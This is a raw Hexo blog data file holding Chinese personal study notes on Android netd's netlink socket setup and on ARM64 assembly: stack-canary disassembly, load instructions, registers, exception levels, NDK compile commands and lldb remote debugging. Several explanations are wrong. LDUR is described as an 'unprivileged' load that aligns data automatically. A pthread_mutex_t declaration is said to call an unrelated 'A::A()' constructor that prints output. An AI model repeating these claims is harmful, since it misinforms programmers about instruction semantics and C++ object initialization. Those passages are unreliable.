RTMGRP_IPV6_ROUTE |\n                                 (1 &lt;&lt; (RTNLGRP_ND_USEROPT - 1)),\n     NetlinkListener::NETLINK_FORMAT_BINARY, false)) == nullptr) &#123;\n    return -1;\n&#125;\n\nif ((mQuotaHandler = setupSocket(&amp;mQuotaSock, NETLINK_NFLOG,\n        NFLOG_QUOTA_GROUP, NetlinkListener::NETLINK_FORMAT_BINARY, false)) == nullptr) &#123;\n    ALOGW(&quot;Unable to open qlog quota socket, check if xt_quota2 can send via UeventHandler&quot;);\n    // TODO: return -1 once the emulator gets a new kernel.\n&#125;\n\nif ((mStrictHandler = setupSocket(&amp;mStrictSock, NETLINK_NETFILTER,\n        0, NetlinkListener::NETLINK_FORMAT_BINARY_UNICAST, true)) == nullptr) &#123;\n    ALOGE(&quot;Unable to open strict socket&quot;);\n    // TODO: return -1 once the emulator gets a new kernel.\n&#125;\n\nreturn 0;\n</code></pre>\n<p>}<br>NetlinkHandler *NetlinkManager::setupSocket(int *sock, int netlinkFamily,<br>    int groups, int format, bool configNflog){<br>    //初始化sock 地址<br>    struct sockaddr_nl nladdr;<br>    int sz = 64 * 1024;<br>    int on = 1;</p>\n<pre><code>memset(&amp;nladdr, 0, sizeof(nladdr));\nnladdr.nl_family = AF_NETLINK;\n// Kernel will assign a unique nl_pid if set to zero.\nnladdr.nl_pid = 0;\nnladdr.nl_groups = groups;\n// 创建socket\nif ((*sock = socket(PF_NETLINK, SOCK_DGRAM | SOCK_CLOEXEC, netlinkFamily)) &lt; 0) &#123;\nALOGE(&quot;Unable to create netlink socket for family %d: %s&quot;, netlinkFamily, strerror(errno));\nreturn nullptr;&#125;\n&#39;&#39;&#39;\n// 绑定sock\nif (bind(*sock, (struct sockaddr *) &amp;nladdr, sizeof(nladdr)) &lt; 0) &#123;\nALOGE(&quot;Unable to bind netlink socket: %s&quot;, strerror(errno));\nclose(*sock);\nreturn nullptr;&#125;\n// \nNetlinkHandler *handler = new NetlinkHandler(this, *sock, format);\nif (handler-&gt;start()) &#123;\n    ALOGE(&quot;Unable to start NetlinkHandler: %s&quot;, strerror(errno));\n    close(*sock);\n    return nullptr;\n&#125;\n</code></pre>\n<p>}</p>\n<p>NetlinkHandler 继承了SocketListener<br>pthread_mutex_t         mClientsLock;</p>\n<p>void SocketListener::init(const char *socketName, int socketFd, bool listen, bool useCmdNum) {<br>    mListen = listen;<br>    mSocketName = socketName;<br>    mSock = socketFd;<br>    mUseCmdNum = useCmdNum;<br>    pthread_mutex_init(&amp;mClientsLock, nullptr);<br>}<br>对于mClientsLock 声明后直接能用：<br>在C++中，当你声明一个变量，包括一个类的实例时，不管其构造函数在声明点是否已经被明确调用，该变量都会在内存中被分配空间，并且其地址可以被取用和使用。<br>当你声明pthread_mutex_t mClientsLock;时，这条语句做了两件事：</p>\n<p>内存分配：它为类pthread_mutex_t的一个实例分配内存空间。这意味着有一个特定的内存位置被设置来存储属于mClientsLock的所有数据。</p>\n<p>构造函数调用：它自动调用了默认构造函数A::A()，这就是为什么你会看到控制台上打印出”the A() call”。这是对象初始化过程的一部分。</p>\n"},{"title":"ARM64","_content":"\n### CPSR \n实现金丝雀机制，防止栈溢出\nlibnativelib.so:0000007E929D3B90 MRS             X8, #3, c13, c0, #2\nlibnativelib.so:0000007E929D3B94 LDR             X8, [X8,#0x28]\nlibnativelib.so:0000007E929D3B98 STUR            X8, [X29,#var_8]\n\n\n\nlibnativelib.so:0000007E929D3CBC MRS             X8, #3, c13, c0, #2\nlibnativelib.so:0000007E929D3CC0 LDR             X8, [X8,#0x28]\nlibnativelib.so:0000007E929D3CC4 LDUR            X9, [X29,#var_8]\nlibnativelib.so:0000007E929D3CC8 SUBS            X8, X8, X9\nlibnativelib.so:0000007E929D3CCC B.NE            loc_7E929D3CE0\n\n//https://cataloc.gitee.io/blog/2021/04/24/Android%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84Canary%E6%9C%BA%E5%88%B6/\n\n### LDR\n`LDR` 和 `LDUR` 都是ARM汇编中用于加载（Load）数据的指令，但它们有一些重要的区别：\n\n1. LDR（Load Register）：\n   - `LDR` 指令用于从内存中加载数据，并将其存储到通用寄存器中。\n   - `LDR` 指令可以加载各种数据类型，包括字节、半字、字、双字以及浮点数等。\n   - `LDR` 指令执行标准的内存访问，根据所加载数据的大小，可能会引发数据对齐异常（例如，尝试加载未对齐的数据）。\n   - `LDR` 指令通常用于访问常规内存，如堆、栈或全局数据。\n\n2. LDUR（Load Register Unprivileged）：\n   - `LDUR` 指令是ARM64架构引入的一种指令，用于无权限加载数据，它通常在用户模式下使用。\n   - `LDUR` 指令具有无权限访问内存的特性，因此即使在特权级别较低（如用户模式）也可以使用。\n   - `LDUR` 指令在加载数据时会自动处理数据对齐，不会引发数据对齐异常，这是 `LDUR` 与 `LDR` 的一个重要区别。\n   - `LDUR` 指令也可以加载各种数据类型，但它在无权限访问的情况下更有用。\n\n总结来说，主要区别在于权限和数据对齐处理：\n\n- `LDR` 是标准的加载指令，用于加载数据到通用寄存器，通常在特权级别较高的情况下使用。\n- `LDUR` 是一种无权限加载指令，它可以在用户模式下使用，且具有自动数据对齐的功能，因此更适合无权限访问的情况。\n\n选择使用哪个指令取决于特定的应用场景和访问内存的权限要求。\n\n`LDRB` 是ARM汇编中的指令，用于从内存中加载一个字节（8位数据）并将其存储到通用寄存器中。`LDRB` 的名称表示 \"Load Byte\"，它执行以下操作：\n\n1. 从指定的内存地址读取一个字节的数据。\n2. 将读取的字节数据零扩展到32位，然后将其存储在目标通用寄存器中。\n\n`LDRB` 指令的通用格式如下：\n\n```assembly\nLDRB Rd, [Rn, #offset]\n```\n\n其中：\n- `Rd` 是目标通用寄存器，用于存储加载的字节数据。\n- `Rn` 是基址寄存器，包含了内存地址的基址。\n- `offset` 是一个偏移量，指定要加载的内存地址相对于基址寄存器 `Rn` 的偏移。\n\n举个例子，如果要从内存地址 `R0 + 8` 处加载一个字节，然后将其存储到通用寄存器 `R1` 中，可以使用以下指令：\n\n```assembly\nLDRB R1, [R0, #8]\n```\n\n这条指令将加载地址为 `R0 + 8` 处的一个字节，将其零扩展为32位，然后将其存储在 `R1` 寄存器中。`LDRB` 通常用于加载单个字节的数据，例如字符或字节型的数据。\n\n### MRS\n\n\n# ARM64 学习：\n\n## 一、基础知识\n### 1.ARMv8特色：\n    * (1) 超大的物理地址空间(Large Physical Address)，提供超过4GB物理内存的访问；\n        (2) 64位宽的虚拟地址空间(64-bit Virtual Addresing);\n        (3) 提供31个64位宽的通用寄存器，可以减少对栈的访问，从而提高性能；\n        (4) 提供16KB和64KB的页面，有助于降低TLB的未命中率(miss rate);\n        (5) 全新的异常处理模型，有助于降低操作系统和虚拟化的实现复杂度；\n        (6)全新的加载-获取，存储-释放指令(Load-Acquire, Store-Release Instructions)。专门为C++11，C11以及Java内存模型设计；\n\n    2 执行状态\n        AArch64: 64位的执行状态：\n        (1) 提供31个64位通用寄存器；\n        (2) 提供64位的程序计数器寄存器PC、栈指针寄存器SP以及异常链接寄存器；\n        (3) 提供A64指令集；\n        (4)定义ARMv8异常模型，支持4个异常等级，EL0~EL3;\n        (5)提供64位的内存模型；\n        (6)定义一组处理器状态(PSTATE)用来保存PE的状态；\n        AArch32: 32位的执行状态：\n        (1) 提供13个632位通用寄存器, 32位的程序计数寄存器PC、栈指针寄存器SP、链接寄存器；\n        (2) 提供A32,T32指令集；\n        (3)定义ARMv7异常模型，基于PE模式并映射到ARMv8的异常模型中；\n        (4)提供32位虚拟内存访问机制；\n        (5)定义一组处理器状态(PSTATE)用来保存PE的状态；\n\n    3 ARMv8包含的寄存器\n        3.1 ARMv8包含31个通用寄存器\n            AArch64运行状态支持31个通用寄存器X0~X30，AArch32状态支持16个32位通用寄存器；\n            X0~X30：通用寄存器；\n            SP: 栈指针寄存器；\n            PC：程序计数寄存器；\n            其中：x30寄存器（lr寄存器）\n                x30寄存器是链接寄存器，用于保存函数的返回地址，当ret指令执行时，会寻找x30寄存器中的值，作为返回地址；\n                x29寄存器是fp寄存器，用于保存函数的栈帧指针，指向函数的栈帧起始地址，即栈底地址；\n\n        3.2 系统寄存器\n            系统寄存器提供控制和状态，在AArch64状态下，很多系统寄存器根据不同的异常等级提供不同的变种寄存器：\n            <reg_name>_ELx, x is 0,1,2, or 3\n            比如SP_EL0表示在EL0下的栈指针寄存器；\n\n        3.3 SIMD/FP寄存器：\n            支持128bit寄存器\n\n        3.4 特殊寄存器\n            XZE\n\n    4.数据类型\n        Byte: 8bit\n        Halfword: 16bit\n        Word: 32bit\n        Doubleworld: 64bit\n        Quadword: 128bit\n\n    5.异常模型\n        Exception Levels确定了处理器当前运行的特权级别，类似ARMv7架构中的特权等级\n        EL0: 用户特权，用于运行普通应用程序；\n        EL1: 系统特权，通常用于运行操作系统；\n        EL2: 运行虚拟化扩展的虚拟监控程序(Hypervisor);\n        EL3: 运行安全世界中的安全监控器(Secure Monitor);\n        异常级别\t应用场景\t安全世界\n        EL0\tAPP\tSecure OS\n        EL1\tGuest OS\tsECURE OS\n        EL2\tHypervisor\tSecure Hypervisor\n        EL3\tSecure—>\t–>monitor\n\n    6.A64汇编指令介绍：\n        1.A64指令集只能运行在aarch64环境中；\n        2.所有的A64汇编指令都是32bit宽；\n        3.A64支持全部大写或小写书写方式；\n        4.寄存器命名,\n        Name\tsize\tEncoding\tDescriptio\n        Wn\t32bits\t0~30\tGeneral-purpose register0~30\n        Xn\t64bit\t0~30\tGeneral-purpose register0~30\n        WZR\t32bits\t31\tZero register\n        XZR\t64bit\t31\tZero register\n        WSP\t32bits\t31\tCurrent stack pointer\n        SP\t64bit\t31\tCurrent stack pointer\n    \n    7.A64指令分类\n        内存加载和存储指令：\n        多字节内存加载和存储：\n        算术和移位指令：\n        位操作指令：\n        条件操作：\n        跳转指令：\n        独占访存指令：\n        内存屏障指令：\n        异常处理指令：\n        系统寄存器访问指令：\n\n## 二、ARM 直接编译.s 文件\n\ncd /Users/nuoen/Library/Android/sdk/ndk/25.2.9519653/toolchains/llvm/prebuilt/\n目录更新：\n/Users/nuoen/Library/Android/sdk/ndk/27.0.12077973/toolchains/llvm/prebuilt/darwin-x86_64/bin\n\n直接编译.s 文件，/Users/nuoen/Documents/AndroidSecurity/fridaScript/arm64.s\nandroid 8.1 :\n```\n./clang -target aarch64-linux-android26 -v  ~/Documents/AndroidSecurity/fridaScript/arm64.s -o ~/Documents/AndroidSecurity/fridaScript/arm64android --static -ffunction-sections -fdata-sections -Wl,--gc-sections \n```\nandroid 13 :\n```\n./clang -target aarch64-linux-android31 -v  ~/Documents/AndroidSecurity/fridaScript/arm64.s -o ~/Documents/AndroidSecurity/fridaScript/arm64android --static\n```\n其中：\n--static 主要解决 : ld: error: relocation R_AARCH64_ABS64 cannot be used against local symbol; recompile with -fPIC\n-ffunction-sections -fdata-sections -Wl,--gc-sections 主要解决:\nexecutable's TLS segment is underaligned: alignment is 8, needs to be at least 64 for ARM64 Bionic\nhttps://github.com/termux/termux-packages/issues/8273\n\n\n直接编译.cpp 文件 为可执行文件\n./clang++  -target aarch64-linux-android32   ~/Documents/AndroidSecurity/fridaScript/cppLearn/cpptest.cpp  -o ~/Documents/AndroidSecurity/fridaScript/cppLearn/cpptest\n\n编译.cpp 文件为 .s文件\n./clang++  -target aarch64-linux-android32  -S  ~/Documents/AndroidSecurity/fridaScript/cppLearn/cpptest.cpp  -o ~/Documents/AndroidSecurity/fridaScript/cppLearn/cpptest.s\n利用lldb远程调试\n手机端：\n```\n./lldb-server p --server --listen unix-abstract:///data/local/tmp/debug.sock\n```\n调试端：\n```\n$ lldb-<version>\n$ platform list  # 查看lldb可以连接的平台\n$ platform select remote-android\n$ platform status # 查看平台状态\n$ platform connect unix-abstract-connect:///data/local/tmp/debug.sock\n```\n</details>\n\nA64的存储和加载指令\nldr和str指令\nARMv8也是基于指令加载和存储的架构，即不能直接操作内存\n```\nLDR <reg_dst>,<addr> //把存储器地址的数据加载到目的寄存器中\nSTR <reg_src>,<addr> //把原寄存器的值，存储到内存中\n```\nld指令寻址1：地址偏移模式\n```\nldr Xd,[Xn,$offset]\n```\n\n\nstd:string内存结构\n","source":"_posts/arm.md","raw":"title: ARM64\n---\n\n### CPSR \n实现金丝雀机制，防止栈溢出\nlibnativelib.so:0000007E929D3B90 MRS             X8, #3, c13, c0, #2\nlibnativelib.so:0000007E929D3B94 LDR             X8, [X8,#0x28]\nlibnativelib.so:0000007E929D3B98 STUR            X8, [X29,#var_8]\n\n\n\nlibnativelib.so:0000007E929D3CBC MRS             X8, #3, c13, c0, #2\nlibnativelib.so:0000007E929D3CC0 LDR             X8, [X8,#0x28]\nlibnativelib.so:0000007E929D3CC4 LDUR            X9, [X29,#var_8]\nlibnativelib.so:0000007E929D3CC8 SUBS            X8, X8, X9\nlibnativelib.so:0000007E929D3CCC B.NE            loc_7E929D3CE0\n\n//https://cataloc.gitee.io/blog/2021/04/24/Android%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84Canary%E6%9C%BA%E5%88%B6/\n\n### LDR\n`LDR` 和 `LDUR` 都是ARM汇编中用于加载（Load）数据的指令，但它们有一些重要的区别：\n\n1. LDR（Load Register）：\n   - `LDR` 指令用于从内存中加载数据，并将其存储到通用寄存器中。\n   - `LDR` 指令可以加载各种数据类型，包括字节、半字、字、双字以及浮点数等。\n   - `LDR` 指令执行标准的内存访问，根据所加载数据的大小，可能会引发数据对齐异常（例如，尝试加载未对齐的数据）。\n   - `LDR` 指令通常用于访问常规内存，如堆、栈或全局数据。\n\n2. LDUR（Load Register Unprivileged）：\n   - `LDUR` 指令是ARM64架构引入的一种指令，用于无权限加载数据，它通常在用户模式下使用。\n   - `LDUR` 指令具有无权限访问内存的特性，因此即使在特权级别较低（如用户模式）也可以使用。\n   - `LDUR` 指令在加载数据时会自动处理数据对齐，不会引发数据对齐异常，这是 `LDUR` 与 `LDR` 的一个重要区别。\n   - `LDUR` 指令也可以加载各种数据类型，但它在无权限访问的情况下更有用。\n\n总结来说，主要区别在于权限和数据对齐处理：\n\n- `LDR` 是标准的加载指令，用于加载数据到通用寄存器，通常在特权级别较高的情况下使用。\n- `LDUR` 是一种无权限加载指令，它可以在用户模式下使用，且具有自动数据对齐的功能，因此更适合无权限访问的情况。\n\n选择使用哪个指令取决于特定的应用场景和访问内存的权限要求。\n\n`LDRB` 是ARM汇编中的指令，用于从内存中加载一个字节（8位数据）并将其存储到通用寄存器中。`LDRB` 的名称表示 \"Load Byte\"，它执行以下操作：\n\n1. 从指定的内存地址读取一个字节的数据。\n2. 将读取的字节数据零扩展到32位，然后将其存储在目标通用寄存器中。\n\n`LDRB` 指令的通用格式如下：\n\n```assembly\nLDRB Rd, [Rn, #offset]\n```\n\n其中：\n- `Rd` 是目标通用寄存器，用于存储加载的字节数据。\n- `Rn` 是基址寄存器，包含了内存地址的基址。\n- `offset` 是一个偏移量，指定要加载的内存地址相对于基址寄存器 `Rn` 的偏移。\n\n举个例子，如果要从内存地址 `R0 + 8` 处加载一个字节，然后将其存储到通用寄存器 `R1` 中，可以使用以下指令：\n\n```assembly\nLDRB R1, [R0, #8]\n```\n\n这条指令将加载地址为 `R0 + 8` 处的一个字节，将其零扩展为32位，然后将其存储在 `R1` 寄存器中。`LDRB` 通常用于加载单个字节的数据，例如字符或字节型的数据。\n\n### MRS\n\n\n# ARM64 学习：\n\n## 一、基础知识\n### 1.ARMv8特色：\n    * (1) 超大的物理地址空间(Large Physical Address)，提供超过4GB物理内存的访问；\n        (2) 64位宽的虚拟地址空间(64-bit Virtual Addresing);\n        (3) 提供31个64位宽的通用寄存器，可以减少对栈的访问，从而提高性能；\n        (4) 提供16KB和64KB的页面，有助于降低TLB的未命中率(miss rate);\n        (5) 全新的异常处理模型，有助于降低操作系统和虚拟化的实现复杂度；\n        (6)全新的加载-获取，存储-释放指令(Load-Acquire, Store-Release Instructions)。专门为C++11，C11以及Java内存模型设计；\n\n    2 执行状态\n        AArch64: 64位的执行状态：\n        (1) 提供31个64位通用寄存器；\n        (2) 提供64位的程序计数器寄存器PC、栈指针寄存器SP以及异常链接寄存器；\n        (3) 提供A64指令集；\n        (4)定义ARMv8异常模型，支持4个异常等级，EL0~EL3;\n        (5)提供64位的内存模型；\n        (6)定义一组处理器状态(PSTATE)用来保存PE的状态；\n        AArch32: 32位的执行状态：\n        (1) 提供13个632位通用寄存器, 32位的程序计数寄存器PC、栈指针寄存器SP、链接寄存器；\n        (2) 提供A32,T32指令集；\n        (3)定义ARMv7异常模型，基于PE模式并映射到ARMv8的异常模型中；\n        (4)提供32位虚拟内存访问机制；\n        (5)定义一组处理器状态(PSTATE)用来保存PE的状态；\n\n    3 ARMv8包含的寄存器\n        3.1 ARMv8包含31个通用寄存器\n            AArch64运行状态支持31个通用寄存器X0~X30，AArch32状态支持16个32位通用寄存器；\n            X0~X30：通用寄存器；\n            SP: 栈指针寄存器；\n            PC：程序计数寄存器；\n            其中：x30寄存器（lr寄存器）\n                x30寄存器是链接寄存器，用于保存函数的返回地址，当ret指令执行时，会寻找x30寄存器中的值，作为返回地址；\n                x29寄存器是fp寄存器，用于保存函数的栈帧指针，指向函数的栈帧起始地址，即栈底地址；\n\n        3.2 系统寄存器\n            系统寄存器提供控制和状态，在AArch64状态下，很多系统寄存器根据不同的异常等级提供不同的变种寄存器：\n            <reg_name>_ELx, x is 0,1,2, or 3\n            比如SP_EL0表示在EL0下的栈指针寄存器；\n\n        3.3 SIMD/FP寄存器：\n            支持128bit寄存器\n\n        3.4 特殊寄存器\n            XZE\n\n    4.数据类型\n        Byte: 8bit\n        Halfword: 16bit\n        Word: 32bit\n        Doubleworld: 64bit\n        Quadword: 128bit\n\n    5.异常模型\n        Exception Levels确定了处理器当前运行的特权级别，类似ARMv7架构中的特权等级\n        EL0: 用户特权，用于运行普通应用程序；\n        EL1: 系统特权，通常用于运行操作系统；\n        EL2: 运行虚拟化扩展的虚拟监控程序(Hypervisor);\n        EL3: 运行安全世界中的安全监控器(Secure Monitor);\n        异常级别\t应用场景\t安全世界\n        EL0\tAPP\tSecure OS\n        EL1\tGuest OS\tsECURE OS\n        EL2\tHypervisor\tSecure Hypervisor\n        EL3\tSecure—>\t–>monitor\n\n    6.A64汇编指令介绍：\n        1.A64指令集只能运行在aarch64环境中；\n        2.所有的A64汇编指令都是32bit宽；\n        3.A64支持全部大写或小写书写方式；\n        4.寄存器命名,\n        Name\tsize\tEncoding\tDescriptio\n        Wn\t32bits\t0~30\tGeneral-purpose register0~30\n        Xn\t64bit\t0~30\tGeneral-purpose register0~30\n        WZR\t32bits\t31\tZero register\n        XZR\t64bit\t31\tZero register\n        WSP\t32bits\t31\tCurrent stack pointer\n        SP\t64bit\t31\tCurrent stack pointer\n    \n    7.A64指令分类\n        内存加载和存储指令：\n        多字节内存加载和存储：\n        算术和移位指令：\n        位操作指令：\n        条件操作：\n        跳转指令：\n        独占访存指令：\n        内存屏障指令：\n        异常处理指令：\n        系统寄存器访问指令：\n\n## 二、ARM 直接编译.s 文件\n\ncd /Users/nuoen/Library/Android/sdk/ndk/25.2.9519653/toolchains/llvm/prebuilt/\n目录更新：\n/Users/nuoen/Library/Android/sdk/ndk/27.0.12077973/toolchains/llvm/prebuilt/darwin-x86_64/bin\n\n直接编译.s 文件，/Users/nuoen/Documents/AndroidSecurity/fridaScript/arm64.s\nandroid 8.1 :\n```\n./clang -target aarch64-linux-android26 -v  ~/Documents/AndroidSecurity/fridaScript/arm64.s -o ~/Documents/AndroidSecurity/fridaScript/arm64android --static -ffunction-sections -fdata-sections -Wl,--gc-sections \n```\nandroid 13 :\n```\n./clang -target aarch64-linux-android31 -v  ~/Documents/AndroidSecurity/fridaScript/arm64.s -o ~/Documents/AndroidSecurity/fridaScript/arm64android --static\n```\n其中：\n--static 主要解决 : ld: error: relocation R_AARCH64_ABS64 cannot be used against local symbol; recompile with -fPIC\n-ffunction-sections -fdata-sections -Wl,--gc-sections 主要解决:\nexecutable's TLS segment is underaligned: alignment is 8, needs to be at least 64 for ARM64 Bionic\nhttps://github.com/termux/termux-packages/issues/8273\n\n\n直接编译.cpp 文件 为可执行文件\n./clang++  -target aarch64-linux-android32   ~/Documents/AndroidSecurity/fridaScript/cppLearn/cpptest.cpp  -o ~/Documents/AndroidSecurity/fridaScript/cppLearn/cpptest\n\n编译.cpp 文件为 .s文件\n./clang++  -target aarch64-linux-android32  -S  ~/Documents/AndroidSecurity/fridaScript/cppLearn/cpptest.cpp  -o ~/Documents/AndroidSecurity/fridaScript/cppLearn/cpptest.s\n利用lldb远程调试\n手机端：\n```\n./lldb-server p --server --listen unix-abstract:///data/local/tmp/debug.sock\n```\n调试端：\n```\n$ lldb-<version>\n$ platform list  # 查看lldb可以连接的平台\n$ platform select remote-android\n$ platform status # 查看平台状态\n$ platform connect unix-abstract-connect:///data/local/tmp/debug.sock\n```\n</details>\n\nA64的存储和加载指令\nldr和str指令\nARMv8也是基于指令加载和存储的架构，即不能直接操作内存\n```\nLDR <reg_dst>,<addr> //把存储器地址的数据加载到目的寄存器中\nSTR <reg_src>,<addr> //把原寄存器的值，存储到内存中\n```\nld指令寻址1：地址偏移模式\n```\nldr Xd,[Xn,$offset]\n```\n\n\nstd:string内存结构\n","slug":"arm","published":1,"date":"2023-12-28T12:55:47.614Z","updated":"2024-10-31T17:03:17.404Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44rit1000nv8fy6s8q8fp4","content":"<h3 id=\"CPSR\"><a href=\"#CPSR\" class=\"headerlink\" title=\"CPSR\"></a>CPSR</h3><p>实现金丝雀机制，防止栈溢出<br>libnativelib.so:0000007E929D3B90 MRS             X8, #3, c13, c0, #2<br>libnativelib.so:0000007E929D3B94 LDR             X8, [X8,#0x28]<br>libnativelib.so:0000007E929D3B98 STUR            X8, [X29,#var_8]</p>\n<p>libnativelib.so:0000007E929D3CBC MRS             X8, #3, c13, c0, #2<br>libnativelib.so:0000007E929D3CC0 LDR             X8, [X8,#0x28]<br>libnativelib.so:0000007E929D3CC4 LDUR            X9, [X29,#var_8]<br>libnativelib.so:0000007E929D3CC8 SUBS            X8, X8, X9<br>libnativelib.so:0000007E929D3CCC B.NE            loc_7E929D3CE0</p>\n<p>//<a href=\"https://cataloc.gitee.io/blog/2021/04/24/Android%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84Canary%E6%9C%BA%E5%88%B6/\">https://cataloc.gitee.io/blog/2021/04/24/Android%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84Canary%E6%9C%BA%E5%88%B6/</a></p>\n<h3 id=\"LDR\"><a href=\"#LDR\" class=\"headerlink\" title=\"LDR\"></a>LDR</h3><p><code>LDR</code> 和 <code>LDUR</code> 都是ARM汇编中用于加载（Load）数据的指令，但它们有一些重要的区别：</p>\n<ol>\n<li><p>LDR（Load Register）：</p>\n<ul>\n<li><code>LDR</code> 指令用于从内存中加载数据，并将其存储到通用寄存器中。</li>\n<li><code>LDR</code> 指令可以加载各种数据类型，包括字节、半字、字、双字以及浮点数等。</li>\n<li><code>LDR</code> 指令执行标准的内存访问，根据所加载数据的大小，可能会引发数据对齐异常（例如，尝试加载未对齐的数据）。</li>\n<li><code>LDR</code> 指令通常用于访问常规内存，如堆、栈或全局数据。</li>\n</ul>\n</li>\n<li><p>LDUR（Load Register Unprivileged）：</p>\n<ul>\n<li><code>LDUR</code> 指令是ARM64架构引入的一种指令，用于无权限加载数据，它通常在用户模式下使用。</li>\n<li><code>LDUR</code> 指令具有无权限访问内存的特性，因此即使在特权级别较低（如用户模式）也可以使用。</li>\n<li><code>LDUR</code> 指令在加载数据时会自动处理数据对齐，不会引发数据对齐异常，这是 <code>LDUR</code> 与 <code>LDR</code> 的一个重要区别。</li>\n<li><code>LDUR</code> 指令也可以加载各种数据类型，但它在无权限访问的情况下更有用。</li>\n</ul>\n</li>\n</ol>\n<p>总结来说，主要区别在于权限和数据对齐处理：</p>\n<ul>\n<li><code>LDR</code> 是标准的加载指令，用于加载数据到通用寄存器，通常在特权级别较高的情况下使用。</li>\n<li><code>LDUR</code> 是一种无权限加载指令，它可以在用户模式下使用，且具有自动数据对齐的功能，因此更适合无权限访问的情况。</li>\n</ul>\n<p>选择使用哪个指令取决于特定的应用场景和访问内存的权限要求。</p>\n<p><code>LDRB</code> 是ARM汇编中的指令，用于从内存中加载一个字节（8位数据）并将其存储到通用寄存器中。<code>LDRB</code> 的名称表示 “Load Byte”，它执行以下操作：</p>\n<ol>\n<li>从指定的内存地址读取一个字节的数据。</li>\n<li>将读取的字节数据零扩展到32位，然后将其存储在目标通用寄存器中。</li>\n</ol>\n<p><code>LDRB</code> 指令的通用格式如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LDRB Rd, [Rn, #offset]</span><br></pre></td></tr></table></figure>\n\n<p>其中：</p>\n<ul>\n<li><code>Rd</code> 是目标通用寄存器，用于存储加载的字节数据。</li>\n<li><code>Rn</code> 是基址寄存器，包含了内存地址的基址。</li>\n<li><code>offset</code> 是一个偏移量，指定要加载的内存地址相对于基址寄存器 <code>Rn</code> 的偏移。</li>\n</ul>\n<p>举个例子，如果要从内存地址 <code>R0 + 8</code> 处加载一个字节，然后将其存储到通用寄存器 <code>R1</code> 中，可以使用以下指令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LDRB R1, [R0, #8]</span><br></pre></td></tr></table></figure>\n\n<p>这条指令将加载地址为 <code>R0 + 8</code> 处的一个字节，将其零扩展为32位，然后将其存储在 <code>R1</code> 寄存器中。<code>LDRB</code> 通常用于加载单个字节的数据，例如字符或字节型的数据。</p>\n<h3 id=\"MRS\"><a href=\"#MRS\" class=\"headerlink\" title=\"MRS\"></a>MRS</h3><h1 id=\"ARM64-学习：\"><a href=\"#ARM64-学习：\" class=\"headerlink\" title=\"ARM64 学习：\"></a>ARM64 学习：</h1><h2 id=\"一、基础知识\"><a href=\"#一、基础知识\" class=\"headerlink\" title=\"一、基础知识\"></a>一、基础知识</h2><h3 id=\"1-ARMv8特色：\"><a href=\"#1-ARMv8特色：\" class=\"headerlink\" title=\"1.ARMv8特色：\"></a>1.ARMv8特色：</h3><pre><code>* (1) 超大的物理地址空间(Large Physical Address)，提供超过4GB物理内存的访问；\n    (2) 64位宽的虚拟地址空间(64-bit Virtual Addresing);\n    (3) 提供31个64位宽的通用寄存器，可以减少对栈的访问，从而提高性能；\n    (4) 提供16KB和64KB的页面，有助于降低TLB的未命中率(miss rate);\n    (5) 全新的异常处理模型，有助于降低操作系统和虚拟化的实现复杂度；\n    (6)全新的加载-获取，存储-释放指令(Load-Acquire, Store-Release Instructions)。专门为C++11，C11以及Java内存模型设计；\n\n2 执行状态\n    AArch64: 64位的执行状态：\n    (1) 提供31个64位通用寄存器；\n    (2) 提供64位的程序计数器寄存器PC、栈指针寄存器SP以及异常链接寄存器；\n    (3) 提供A64指令集；\n    (4)定义ARMv8异常模型，支持4个异常等级，EL0~EL3;\n    (5)提供64位的内存模型；\n    (6)定义一组处理器状态(PSTATE)用来保存PE的状态；\n    AArch32: 32位的执行状态：\n    (1) 提供13个632位通用寄存器, 32位的程序计数寄存器PC、栈指针寄存器SP、链接寄存器；\n    (2) 提供A32,T32指令集；\n    (3)定义ARMv7异常模型，基于PE模式并映射到ARMv8的异常模型中；\n    (4)提供32位虚拟内存访问机制；\n    (5)定义一组处理器状态(PSTATE)用来保存PE的状态；\n\n3 ARMv8包含的寄存器\n    3.1 ARMv8包含31个通用寄存器\n        AArch64运行状态支持31个通用寄存器X0~X30，AArch32状态支持16个32位通用寄存器；\n        X0~X30：通用寄存器；\n        SP: 栈指针寄存器；\n        PC：程序计数寄存器；\n        其中：x30寄存器（lr寄存器）\n            x30寄存器是链接寄存器，用于保存函数的返回地址，当ret指令执行时，会寻找x30寄存器中的值，作为返回地址；\n            x29寄存器是fp寄存器，用于保存函数的栈帧指针，指向函数的栈帧起始地址，即栈底地址；\n\n    3.2 系统寄存器\n        系统寄存器提供控制和状态，在AArch64状态下，很多系统寄存器根据不同的异常等级提供不同的变种寄存器：\n        &lt;reg_name&gt;_ELx, x is 0,1,2, or 3\n        比如SP_EL0表示在EL0下的栈指针寄存器；\n\n    3.3 SIMD/FP寄存器：\n        支持128bit寄存器\n\n    3.4 特殊寄存器\n        XZE\n\n4.数据类型\n    Byte: 8bit\n    Halfword: 16bit\n    Word: 32bit\n    Doubleworld: 64bit\n    Quadword: 128bit\n\n5.异常模型\n    Exception Levels确定了处理器当前运行的特权级别，类似ARMv7架构中的特权等级\n    EL0: 用户特权，用于运行普通应用程序；\n    EL1: 系统特权，通常用于运行操作系统；\n    EL2: 运行虚拟化扩展的虚拟监控程序(Hypervisor);\n    EL3: 运行安全世界中的安全监控器(Secure Monitor);\n    异常级别    应用场景    安全世界\n    EL0    APP    Secure OS\n    EL1    Guest OS    sECURE OS\n    EL2    Hypervisor    Secure Hypervisor\n    EL3    Secure—&gt;    –&gt;monitor\n\n6.A64汇编指令介绍：\n    1.A64指令集只能运行在aarch64环境中；\n    2.所有的A64汇编指令都是32bit宽；\n    3.A64支持全部大写或小写书写方式；\n    4.寄存器命名,\n    Name    size    Encoding    Descriptio\n    Wn    32bits    0~30    General-purpose register0~30\n    Xn    64bit    0~30    General-purpose register0~30\n    WZR    32bits    31    Zero register\n    XZR    64bit    31    Zero register\n    WSP    32bits    31    Current stack pointer\n    SP    64bit    31    Current stack pointer\n\n7.A64指令分类\n    内存加载和存储指令：\n    多字节内存加载和存储：\n    算术和移位指令：\n    位操作指令：\n  